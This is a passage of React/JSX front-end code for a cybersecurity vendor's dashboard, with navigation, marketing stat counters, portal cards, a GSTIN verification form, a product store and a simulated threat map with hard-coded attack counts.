            <span className={`w-1.5 h-1.5 rounded-full ${item.dot} opacity-60 group-hover:opacity-100 transition-opacity`}></span>
            {item.label}
          </a>
        ))}
        <div className="flex-1"></div>
        <a
          href="https://intel.cyberdudebivash.com/upgrade.html"
          target="_blank"
          rel="noopener noreferrer"
          className="shrink-0 text-[9px] font-mono text-amber-400 bg-amber-950/30 border-l border-amber-900/30 px-3 py-2 hover:bg-amber-950/50 transition-all flex items-center gap-1.5"
        >
          <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse"></span>
          ENTERPRISE UPGRADE
        </a>
      </div>

      {/* 3. MOBILE MENU BAR */}
      <div className="lg:hidden bg-slate-950 border-b border-slate-900 p-2 flex justify-between overflow-x-auto gap-1">
        <button 
          onClick={() => setCurrentView("home")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "home" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          Gateway
        </button>
        <button 
          onClick={() => setCurrentView("intel")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "intel" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          Sentinel APEX
        </button>
        <button 
          onClick={() => setCurrentView("ai")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "ai" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          AI Audit
        </button>
        <button 
          onClick={() => setCurrentView("tools")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "tools" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          ThreatCore Tools
        </button>
        <button 
          onClick={() => setCurrentView("blog")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "blog" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          Blog
        </button>
        <button 
          onClick={() => setCurrentView("api")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "api" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          API
        </button>
      </div>

      {/* 4. MAIN WORKSPACE VIEW ROUTER */}
      <div className="flex-1">

        {/* ================= VIEW 1: HOME / OFFICIAL GATEWAY (Image 4 copy) ================= */}
        {currentView === "home" && (
          <div className="p-4 md:p-8 space-y-8 max-w-7xl mx-auto w-full animate-fade-in">
            
            {/* Header Hero Section */}
            <div className="text-center space-y-4 max-w-3xl mx-auto">
              <div className="inline-flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-full py-1.5 px-4 text-xs font-mono text-cyan-400">
                <span className="w-2.5 h-2.5 rounded-full bg-cyan-400 animate-ping"></span>
                CYBERDUDEBIVASH® Global Cybersecurity Authority
              </div>
              
              <h2 className="text-3xl md:text-5xl font-extrabold tracking-tight text-white leading-tight">
                AI-Powered Cyber Defense &amp; <br />
                <span className="bg-gradient-to-r from-cyan-400 via-sky-400 to-emerald-400 bg-clip-text text-transparent">
                  Threat Intelligence Platform
                </span>
              </h2>

              <p className="text-sm md:text-base text-slate-400 leading-relaxed font-sans">
                CYBERDUDEBIVASH® delivers real-time threat intelligence, AI-powered SOC operations, 100+ production tools, and programmable REST APIs - unified in one enterprise command center used by security teams globally. Stop threat matrices before they impact your subnets.
              </p>

              <div className="flex flex-wrap items-center justify-center gap-4 pt-3">
                <button 
                  onClick={() => setCurrentView("intel")} 
                  className="px-6 py-3 bg-cyan-500 text-black hover:bg-cyan-400 font-extrabold rounded text-xs uppercase tracking-wider transition-all cursor-pointer flex items-center gap-2 shadow-lg shadow-cyan-500/20"
                >
                  <Activity className="w-4 h-4" /> View Live Threat Feed
                </button>
                <button 
                  onClick={() => setCurrentView("ai")} 
                  className="px-6 py-3 bg-slate-900 hover:bg-slate-800 text-slate-200 border border-slate-800 hover:border-slate-700 font-extrabold rounded text-xs uppercase tracking-wider transition-all cursor-pointer flex items-center gap-2"
                >
                  <Shield className="w-4 h-4 text-cyan-400" /> Start Free Security Audit
                </button>
              </div>
            </div>

            {/* Core Stats Counters */}
            <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center">
                <div className="text-2xl md:text-3xl font-extrabold text-cyan-400 font-mono">500K+</div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">Threat IOCs</div>
              </div>
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center">
                <div className="text-2xl md:text-3xl font-extrabold text-emerald-400 font-mono">50+</div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">Countries Protected</div>
              </div>
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center">
                <div className="text-2xl md:text-3xl font-extrabold text-purple-400 font-mono">100+</div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">AI Tools</div>
              </div>
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center">
                <div className="text-2xl md:text-3xl font-extrabold text-amber-500 font-mono">99.9%</div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">Uptime SLA</div>
              </div>
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center col-span-2 md:col-span-1">
                <div className="text-2xl md:text-3xl font-extrabold text-red-500 font-mono flex items-center justify-center gap-1.5">
                  <span className="w-2.5 h-2.5 bg-red-500 rounded-full animate-pulse"></span>
                  24/7
                </div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">SOC ACTIVE</div>
              </div>
            </div>

            {/* AI SOC Active Control Command Center */}
            <div className="space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2">
                <div className="space-y-0.5">
                  <h3 className="text-xs font-extrabold text-cyan-400 uppercase tracking-widest font-mono">Autonomous AI SOC Orchestration &amp; Response Terminal</h3>
                  <p className="text-[10px] text-slate-500 font-mono">Fully unified AI native network threat assessment, incident emulation, and real-time mitigation playbooks.</p>
                </div>
                <div className="text-[9px] font-mono text-slate-500 flex items-center gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-cyan-500 animate-pulse"></span>
                  ORCHESTRATOR ONLINE (v4.9.1)
                </div>
              </div>
              <AiSocDashboard />
            </div>

            {/* Grid of 5 Live Connected Platforms */}
            <div className="space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2">
                <div className="space-y-0.5">
                  <h3 className="text-xs font-extrabold text-cyan-400 uppercase tracking-widest font-mono">CYBERDUDEBIVASH® Unified Platforms &amp; Portals</h3>
                  <p className="text-[10px] text-slate-500 font-mono">Direct secure gateways to active corporate sub-nets &amp; public cloud channels.</p>
                </div>
                <div className="text-[9px] font-mono text-slate-500 flex items-center gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                  GLOBAL ACTIVE DIRECTORY SYNC
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
                {ECOSYSTEM_PORTALS.map((portal) => {
                  const isPinging = pingingPortalId === portal.id;
                  return (
                    <div 
                      key={portal.id}
                      className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg flex flex-col justify-between space-y-4 hover:border-cyan-500/50 hover:bg-slate-900/40 transition-all group relative overflow-hidden"
                    >
                      <div className="absolute top-0 right-0 w-16 h-16 bg-cyan-500/5 rounded-full blur-xl group-hover:bg-cyan-500/20 transition-all"></div>
                      
                      <div className="space-y-1">
                        <div className="flex items-center justify-between gap-1">
                          <span className="text-[9px] font-mono text-slate-500 uppercase tracking-wider">{portal.tagline}</span>
                          <span className="text-[9px] font-mono text-emerald-400 bg-emerald-950/80 px-1 py-0.5 rounded border border-emerald-900/30 flex items-center gap-1 shrink-0">
                            <span className="w-1 h-1 rounded-full bg-emerald-400 animate-pulse"></span>
                            {portal.responseMs}ms
                          </span>
                        </div>
                        
                        <h4 className="text-xs font-extrabold text-white tracking-wide uppercase group-hover:text-cyan-400 transition-colors">{portal.name}</h4>
                        <p className="text-[10px] text-slate-400 leading-snug">{portal.description}</p>
                      </div>

                      <div className="space-y-2 pt-2">
                        <a 
                          href={portal.url} 
                          target="_blank" 
                          rel="noopener noreferrer" 
                          className="w-full bg-slate-900 hover:bg-slate-800 text-slate-200 border border-slate-800 py-1.5 rounded text-[10px] font-extrabold uppercase tracking-widest flex items-center justify-center gap-1.5 transition-all text-center"
                        >
                          Visit Live <ExternalLink className="w-3 h-3 text-cyan-400" />
                        </a>
                        <button
                          onClick={() => triggerPortalPing(portal.id, portal.name, portal.url)}
                          className={`w-full py-1.5 rounded text-[10px] font-mono uppercase tracking-wider transition-all border cursor-pointer ${
                            isPinging 
                              ? "bg-cyan-950 text-cyan-400 border-cyan-800 animate-pulse" 
                              : "bg-slate-950 text-slate-500 border-slate-900 hover:text-slate-300 hover:bg-slate-900"
                          }`}
                        >
                          {isPinging ? "Handshaking..." : "Test Connection"}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Dynamic Handshake Logs Terminal */}
            {pingingPortalId && (
              <div className="bg-slate-950 border border-slate-800 rounded-lg overflow-hidden animate-fade-in">
                <div className="bg-[#0c1117] px-4 py-2 border-b border-slate-800 flex items-center justify-between">
                  <div className="flex items-center gap-2 text-[11px] font-mono font-bold text-cyan-400 uppercase tracking-wider">
                    <Terminal className="w-3.5 h-3.5 text-cyan-500" />
                    <span>Active Telemetry Connection Handshaking Terminal</span>
                  </div>
                  <button 
                    onClick={() => setPingingPortalId(null)}
                    className="text-slate-500 hover:text-slate-300 font-mono text-[10px] uppercase tracking-wider cursor-pointer"
                  >
                    [Close Terminal]
                  </button>
                </div>
                <div className="p-4 font-mono text-[11px] text-slate-450 space-y-1 bg-black/90 select-text max-h-48 overflow-y-auto leading-relaxed">
                  {pingLogs.map((log, idx) => (
                    <div key={idx} className="flex gap-2">
                      <span className="text-cyan-600">[{idx + 1}]</span>
                      <span className={log.includes("[SUCCESS]") ? "text-emerald-400 font-bold" : log.includes("[ERR]") || log.includes("[WARNING]") ? "text-red-400" : "text-slate-300"}>
                        {log}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* ===== ECOSYSTEM DISCOVERY SECTION ===== */}
            <div className="bg-[#0a0d12] border border-slate-800/80 rounded-xl p-5 md:p-6">
              <EcosystemDiscovery onContact={() => setShowContactModal(true)} />
            </div>

            {/* Global Social Intelligence Command Center */}
            <div className="bg-[#0c1117]/60 border border-slate-800/80 rounded-lg p-5 space-y-4">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 border-b border-slate-900 pb-3">
                <div className="space-y-0.5">
                  <h3 className="text-xs font-extrabold text-cyan-400 uppercase tracking-widest font-mono">Ecosystem Social Intelligence &amp; Gig Channels</h3>
                  <p className="text-[10px] text-slate-500 font-mono">Autonomous media outlets, freelancing agency registries, and verified developer coordinates.</p>
                </div>
                
                {/* Category filters */}
                <div className="flex flex-wrap gap-1 bg-slate-950 p-1 rounded border border-slate-900">
                  {["All", "Executive", "Social", "Freelance", "Media"].map((cat) => (
                    <button
                      key={cat}
                      onClick={() => setActiveSocialFilter(cat)}
                      className={`px-2.5 py-1 rounded text-[10px] font-mono tracking-wider transition-all cursor-pointer ${
                        activeSocialFilter === cat 
                          ? "bg-cyan-950 text-cyan-400 border border-cyan-800" 
                          : "text-slate-500 hover:text-slate-300 bg-transparent"
                      }`}
                    >
                      {cat}
                    </button>
                  ))}
                </div>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3">
                {SOCIAL_PROFILES.filter(p => activeSocialFilter === "All" || p.category === activeSocialFilter).map((prof, idx) => (
                  <div 
                    key={idx} 
                    className="bg-slate-950 border border-slate-900 p-3.5 rounded flex flex-col justify-between space-y-3 hover:border-slate-800 hover:bg-slate-900/30 transition-all group"
                  >
                    <div className="space-y-1">
                      <div className="flex items-center justify-between">
                        <span className="text-[9px] font-mono text-cyan-500 bg-cyan-950/50 px-1 py-0.5 rounded border border-cyan-900/30 font-bold uppercase tracking-wider shrink-0">{prof.platform}</span>
                        <span className="text-[8px] font-mono text-slate-650 block uppercase tracking-tight shrink-0">{prof.category}</span>
                      </div>
                      <h5 className="text-[11px] font-extrabold text-slate-200 truncate">{prof.username}</h5>
                      <span className="text-[9px] font-mono text-slate-500 block leading-snug">{prof.metric}</span>
                    </div>

                    <a 
                      href={prof.url} 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="w-full bg-[#0c1117] hover:bg-cyan-500 hover:text-black border border-slate-800 hover:border-cyan-500 text-slate-400 text-[9px] font-mono py-1 rounded uppercase text-center transition-all flex items-center justify-center gap-1 cursor-pointer"
                    >
                      {prof.actionText} <ExternalLink className="w-2.5 h-2.5" />
                    </a>
                  </div>
                ))}
              </div>
            </div>

            {/* Live Sentinel Ticker Monitor (As shown in Image 4) */}
            <div className="bg-slate-950 border border-slate-800 rounded-lg overflow-hidden flex flex-col">
              <div className="bg-[#0c1117] border-b border-slate-800 px-4 py-2 flex items-center justify-between">
                <div className="flex items-center gap-2 text-xs font-bold font-mono uppercase tracking-widest text-slate-300">
                  <Terminal className="w-4 h-4 text-cyan-500" />
                  <span>Sentinel APEX™ Active Event Logger</span>
                </div>
                <div className="text-[10px] font-mono text-slate-500 flex items-center gap-1.5">
                  <span className="inline-block w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                  GLOBAL CLOUD INGEST FEED
                </div>
              </div>
              <div className="p-4 font-mono text-xs text-slate-400 space-y-2 h-56 overflow-y-auto select-text">
                {liveLogs.map((log, index) => (
                  <div key={index} className="flex items-baseline gap-3 border-b border-slate-900/40 pb-1.5 last:border-b-0">
                    <span className="text-slate-600">{log.time}</span>
                    <span className={`px-1 rounded text-[9px] font-bold shrink-0 font-sans tracking-wide uppercase ${
                      log.severity === "CRITICAL" ? "bg-red-950/80 text-red-400 border border-red-800/30 animate-pulse" :
                      log.severity === "BLOCKED" ? "bg-emerald-950/80 text-emerald-400 border border-emerald-800/30" :
                      log.severity === "HIGH" ? "bg-orange-950/80 text-orange-400 border border-orange-800/30" :
                      "bg-yellow-950/80 text-yellow-400 border border-yellow-800/30"
                    }`}>
                      {log.severity}
                    </span>
                    <span className="text-slate-300 truncate">{log.msg}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Compliance badges and certifications bar */}
            <div className="bg-slate-900/50 border border-slate-800/80 rounded-lg p-6 space-y-4">
              <div className="text-center space-y-1">
                <h4 className="text-xs font-bold uppercase tracking-widest font-mono text-slate-400">Compliance &amp; Trust Core</h4>
                <p className="text-[11px] text-slate-500">Every audit, scan, and response is aligned with certified international and domestic security policies.</p>
              </div>
              <div className="flex flex-wrap items-center justify-center gap-3">
                {[
                  { title: "ISO 27001:2022 Certified", col: "text-cyan-400" },
                  { title: "SOC 2 Type II Audited", col: "text-emerald-400" },
                  { title: "GDPR Compliant", col: "text-purple-400" },
                  { title: "PCI-DSS v4.0 Hardened", col: "text-amber-500" },
                  { title: "India DPDP Act 2023", col: "text-slate-300 font-bold" },
                  { title: "MITRE ATT&CK Mapped", col: "text-red-400 font-bold" },
                  { title: "OWASP LLM Top 10", col: "text-sky-400" }
                ].map((item, idx) => (
                  <span key={idx} className="bg-slate-950 border border-slate-800 rounded px-2.5 py-1 text-[10px] font-mono flex items-center gap-1.5">
                    <Check className="w-3 h-3 text-emerald-500" />
                    <span className={item.col}>{item.title}</span>
                  </span>
                ))}
              </div>
            </div>

            {/* Corporate Transparency & India GSTIN Validator Node */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 bg-[#0c1117]/80 border border-slate-800 p-6 rounded-lg">
              <div className="lg:col-span-7 space-y-4">
                <div className="border-l-4 border-cyan-500 pl-3">
                  <h4 className="text-xs font-extrabold uppercase tracking-widest font-mono text-cyan-400">Corporate Entity Coordinates &amp; Legal Identity</h4>
                  <p className="text-[10px] text-slate-500 font-mono">Government of India official incorporation registry details for CyberDudeBivash Pvt Ltd.</p>
                </div>
                
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs font-mono">
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Legal Name (Founder)</span>
                    <span className="text-slate-200 font-bold block">{CORPORATE_REGISTRATION.legalName}</span>
                  </div>
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Trade / Brand Entity</span>
                    <span className="text-cyan-400 font-bold block">{CORPORATE_REGISTRATION.tradeName}</span>
                  </div>
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Permanent Account Number (PAN)</span>
                    <span className="text-amber-500 font-bold block">{CORPORATE_REGISTRATION.pan}</span>
                  </div>
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Government GSTIN ID</span>
                    <span className="text-emerald-400 font-bold block">{CORPORATE_REGISTRATION.gstin}</span>
                  </div>
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1 sm:col-span-2">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Registered HQ Physical Address</span>
                    <span className="text-slate-300 block font-sans leading-normal text-[11px]">{CORPORATE_REGISTRATION.address}</span>
                  </div>
                </div>
              </div>

              <div className="lg:col-span-5 bg-slate-950 border border-slate-900 rounded-lg p-5 flex flex-col justify-between space-y-4">
                <div className="space-y-2">
                  <h5 className="text-[11px] font-bold font-mono text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse"></span>
                    India GSTIN Verification Gateway
                  </h5>
                  <p className="text-[10px] text-slate-500 font-sans leading-snug">
                    Query the Central Board of Indirect Taxes and Customs (CBIC) common registry to confirm active licensing status.
                  </p>
                </div>

                <form onSubmit={verifyGstInward} className="space-y-3">
                  <div className="space-y-1.5">
                    <label className="text-[9px] font-mono text-slate-500 uppercase tracking-widest block">Inward GSTIN Token</label>
                    <div className="flex gap-2">
                      <input 
                        type="text" 
                        value={gstInput}
                        onChange={(e) => setGstInput(e.target.value)}
                        placeholder="E.g. 21ARKPN8270G1ZP"
                        className="flex-1 bg-black border border-slate-800 rounded px-3 py-2 text-xs font-mono text-slate-300 focus:outline-none focus:border-cyan-500"
                      />
                      <button 
                        type="submit" 
                        disabled={gstVerifying}
                        className="bg-cyan-500 hover:bg-cyan-400 text-black px-4 py-2 rounded text-xs font-extrabold uppercase tracking-wider transition-all disabled:opacity-50 cursor-pointer shrink-0"
                      >
                        {gstVerifying ? "Querying..." : "Verify"}
                      </button>
                    </div>
                  </div>
                </form>

                {gstVerificationResult && (
                  <div className={`p-4 rounded border font-mono text-[11px] leading-relaxed animate-fade-in ${
                    gstVerificationResult.status === "SUCCESS_ACTIVE" 
                      ? "bg-emerald-950/40 border-emerald-900 text-slate-300" 
                      : "bg-red-950/40 border-red-900 text-slate-300"
                  }`}>
                    {gstVerificationResult.status === "SUCCESS_ACTIVE" ? (
                      <div className="space-y-2">
                        <div className="flex items-center gap-2 text-emerald-400 font-bold border-b border-emerald-900/60 pb-1.5">
                          <CheckCircle2 className="w-4 h-4" />
                          <span>REGISTRY RECORD ACTIVE</span>
                        </div>
                        <div className="space-y-1 text-[10px]">
                          <div><span className="text-slate-500">Legal Name:</span> <span className="text-slate-200 font-bold">{gstVerificationResult.legalName}</span></div>
                          <div><span className="text-slate-500">Trade Entity:</span> <span className="text-cyan-400 font-bold">{gstVerificationResult.tradeName}</span></div>
                          <div><span className="text-slate-500">Taxpayer Class:</span> <span className="text-slate-300">{gstVerificationResult.taxpayerType}</span></div>
                          <div><span className="text-slate-500">State Code:</span> <span className="text-slate-300">21 (Odisha, IN)</span></div>
                          <div><span className="text-slate-500">Compliance score:</span> <span className="text-emerald-400 font-bold">{gstVerificationResult.complianceScore}</span></div>
                        </div>
                      </div>
                    ) : (
                      <div className="space-y-1.5">
                        <div className="text-red-400 font-bold border-b border-red-900/60 pb-1">Error Unresolved</div>
                        <p className="text-[10px] text-slate-400 font-sans">{gstVerificationResult.message}</p>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>

            {/* Gumroad Products Marketplace */}
            <div className="space-y-4">
              <div className="border-l-4 border-cyan-500 pl-3">
                <h3 className="text-xs font-extrabold uppercase tracking-widest font-mono text-slate-400">Cyber Defense Store (Gumroad Kits)</h3>
                <p className="text-[11px] text-slate-500">Directly download production-ready compliance assets, SIGMA rules, and response playbooks.</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
                {premiumProducts.map((p) => {
                  const isPurchased = purchasedProduct === p.id;
                  return (
                    <div key={p.id} className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg flex flex-col justify-between space-y-3 hover:border-slate-700 transition-all">
                      <div className="space-y-1">
                        <div className="flex justify-between items-start gap-1">
                          <span className="text-[11px] font-bold text-slate-200 line-clamp-2">{p.title}</span>
                          <span className="text-[10px] font-mono text-emerald-400 bg-emerald-950 px-1 py-0.5 rounded border border-emerald-900">{p.price}</span>
                        </div>
                        <p className="text-[10px] text-slate-500 leading-snug">{p.desc}</p>
                      </div>
                      <button
                        onClick={() => handleCheckoutProduct(p)}
                        className={`w-full py-1.5 rounded text-[10px] font-bold uppercase tracking-wider transition-all ${
                          isPurchased 
                            ? "bg-emerald-950 text-emerald-400 border border-emerald-800 flex items-center justify-center gap-1"
                            : "bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 cursor-pointer"
                        }`}
                        id={`gumroad-${p.id}`}
                      >
                        {isPurchased ? (
                          <>
                            <CheckCircle2 className="w-3.5 h-3.5" /> Ordered
                          </>
                        ) : "Checkout"}
                      </button>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Trusted Sectors */}
            <div className="bg-[#0c1117] border border-slate-800 p-6 rounded-lg grid grid-cols-2 md:grid-cols-4 gap-6 text-center">
              <div>
                <span className="text-xl md:text-2xl font-bold font-mono text-slate-300">2,800+</span>
                <p className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">SOC Teams Served</p>
              </div>
              <div>
                <span className="text-xl md:text-2xl font-bold font-mono text-slate-300">99.7%</span>
                <p className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">AI Detection Rate</p>
              </div>
              <div>
                <span className="text-xl md:text-2xl font-bold font-mono text-slate-300">&lt;15m</span>
                <p className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">Managed SOC SLA</p>
              </div>
              <div>
                <span className="text-xl md:text-2xl font-bold font-mono text-slate-300">95%</span>
                <p className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">ROSI Return Rate</p>
              </div>
            </div>

          </div>
        )}

        {/* ================= VIEW 2: SENTINEL APEX THREAT INTEL ================= */}
        {currentView === "intel" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            {/* Real-Time Attack Map Simulation Row */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Live Attack Nodes (SVG/Visual Layout simulation) */}
              <div className="lg:col-span-8 bg-[#0c1117] border border-slate-800 rounded-lg p-4 flex flex-col justify-between min-h-[380px]">
                <div className="flex items-center justify-between border-b border-slate-900 pb-3 mb-3">
                  <div className="space-y-1">
                    <h3 className="text-xs font-bold font-mono uppercase tracking-widest text-slate-300 flex items-center gap-1.5">
                      <Globe className="w-4 h-4 text-cyan-500" />
                      Live Threat Map Indicator
                    </h3>
                    <p className="text-[10px] text-slate-500 leading-none">Interactive nodes &bull; Real-time global intercept paths</p>
                  </div>
                  <span className="text-[10px] font-mono text-cyan-400 bg-cyan-950/40 px-2 py-0.5 rounded border border-cyan-800/50">
                    SCAN SPEED: {scanSpeedHz} K/sec
                  </span>
                </div>

                {/* Animated Cyber Map Nodes */}
                <div className="flex-1 bg-slate-950/70 border border-slate-900 rounded p-4 relative overflow-hidden flex flex-col justify-center items-center">
                  
                  {/* Mock Map Grid lines */}
                  <div className="absolute inset-0 grid grid-cols-8 grid-rows-6 opacity-[0.03] pointer-events-none">
                    {Array.from({ length: 48 }).map((_, i) => (
                      <div key={i} className="border border-cyan-500"></div>
                    ))}
                  </div>

                  {/* Pulsing Cyber Targets */}
                  <div className="absolute top-[20%] left-[20%] text-center">
                    <span className="absolute inline-flex h-4 w-4 rounded-full bg-cyan-500/20 animate-ping"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-cyan-500"></span>
                    <span className="block text-[8px] font-mono text-cyan-400 mt-1 uppercase">US-EAST-01</span>
                  </div>

                  <div className="absolute bottom-[25%] left-[45%] text-center">
                    <span className="absolute inline-flex h-5 w-5 rounded-full bg-emerald-500/20 animate-ping"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
                    <span className="block text-[8px] font-mono text-emerald-400 mt-1 uppercase">HQ_Odisha_IN</span>
                  </div>

                  <div className="absolute top-[40%] right-[25%] text-center">
                    <span className="absolute inline-flex h-6 w-6 rounded-full bg-red-500/20 animate-ping"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
                    <span className="block text-[8px] font-mono text-red-400 mt-1 uppercase">AP-NORTH-04</span>
                  </div>

                  {/* Attack Path line overlays */}
                  <svg className="absolute inset-0 w-full h-full pointer-events-none opacity-40">
                    <line x1="20%" y1="20%" x2="45%" y2="75%" stroke="#06b6d4" strokeWidth="1.5" strokeDasharray="5,5" className="animate-[pulse_2s_infinite]" />
                    <line x1="75%" y1="40%" x2="45%" y2="75%" stroke="#ef4444" strokeWidth="1.5" strokeDasharray="5,3" />
                  </svg>

                  <div className="text-center max-w-sm space-y-2 z-10">
                    <Shield className="w-10 h-10 text-cyan-500 mx-auto animate-pulse" />
                    <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest block">Active Scan Core</span>
                    <p className="text-xs font-semibold text-slate-300">Sentinel APEX Threat Mapping Operational</p>
                    <p className="text-[11px] text-slate-500 leading-normal">Our global sensor network continuously captures, validates, and correlates cyber event streams back to Ragadi, Odisha command center.</p>
                  </div>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-3 pt-3 border-t border-slate-900 text-center font-mono">
                  <div>
                    <span className="text-xs text-slate-500">Origin: USA</span>
                    <span className="block text-xs font-bold text-slate-300 mt-0.5">38 Attacks</span>
                  </div>
                  <div>
                    <span className="text-xs text-slate-500">Origin: Russia</span>
                    <span className="block text-xs font-bold text-[#ef4444] mt-0.5">43 Attacks</span>
                  </div>
                  <div>
                    <span className="text-xs text-slate-500">Origin: China</span>
                    <span className="block text-xs font-bold text-orange-400 mt-0.5">26 Attacks</span>
                  </div>
                  <div>
                    <span className="text-xs text-slate-500">Defense Index</span>
                    <span className="block text-xs font-bold text-emerald-400 mt-0.5">99.98% OK</span>
                  </div>
                </div>

              </div>

              {/* Perimeter Status Metrics */}
              <div className="lg:col-span-4 flex flex-col gap-4">
                
                <div className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg flex flex-col justify-between shrink-0">
                  <h3 className="text-xs font-bold font-mono text-slate-400 uppercase tracking-widest mb-3">Defensive Perimeter Metrics</h3>
                  <div className="space-y-4">
                    <div>
                      <div className="flex justify-between text-[10px] mb-1 font-mono">
                        <span>WAF / Sentinel Load</span>
                        <span className="text-cyan-400">{firewallLoad}%</span>
                      </div>
                      <div className="w-full bg-slate-950 h-1.5 rounded-full overflow-hidden border border-slate-900">
                        <div 
                          className="bg-cyan-500 h-full rounded-full transition-all duration-1000"
                          style={{ width: `${firewallLoad}%` }}
                        ></div>
                      </div>
                    </div>
                    <div>
                      <div className="flex justify-between text-[10px] mb-1 font-mono">
                        <span>AI Model Synchronization</span>
                        <span className="text-emerald-400">100% SECURE</span>
                      </div>
                      <div className="w-full bg-slate-950 h-1.5 rounded-full overflow-hidden border border-slate-900">
                        <div className="bg-emerald-500 h-full rounded-full w-full"></div>
                      </div>
                    </div>
                    <div>
                      <div className="flex justify-between text-[10px] mb-1 font-mono">
                        <span>Sentinel Threat Vault</span>
                        <span className="text-amber-500">OPTIMAL</span>
                      </div>
                      <div className="w-full bg-slate-950 h-1.5 rounded-full overflow-hidden border border-slate-900">
                        <div className="bg-amber-500 h-full rounded-full w-[90%]"></div>
                      </div>
                    </div>
                  </div>

                  <div className="mt-6 border-t border-slate-800 pt-4">
                    <h4 className="text-[10px] font-bold text-slate-400 uppercase font-mono mb-2">Global Threat Distribution</h4>
                    <div className="grid grid-cols-2 gap-2 text-[9px] font-mono text-center">
                      <div className="p-1.5 bg-slate-950 border border-slate-900 rounded text-slate-400">US-EAST: OK</div>
                      <div className="p-1.5 bg-slate-950 border border-slate-900 rounded text-slate-400 font-bold">EU-WEST: OK</div>
                      <div className="p-1.5 bg-slate-950 border border-slate-900 rounded text-emerald-400 font-bold">IN-SOUTH: LIVE</div>
                      <div className="p-1.5 bg-slate-950 border border-slate-900 text-red-400 rounded animate-pulse">AP-NORTH: BUSY</div>
                    </div>
                  </div>
                </div>

                <div className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg flex-1 flex flex-col justify-between">
                  <div className="space-y-2">
                    <h3 className="text-xs font-bold font-mono text-slate-400 uppercase tracking-widest flex items-center justify-between">
                      <span>Threat Risk Index</span>
                      <span className="text-red-400 text-[10px]">P1 CRISIS</span>
                    </h3>
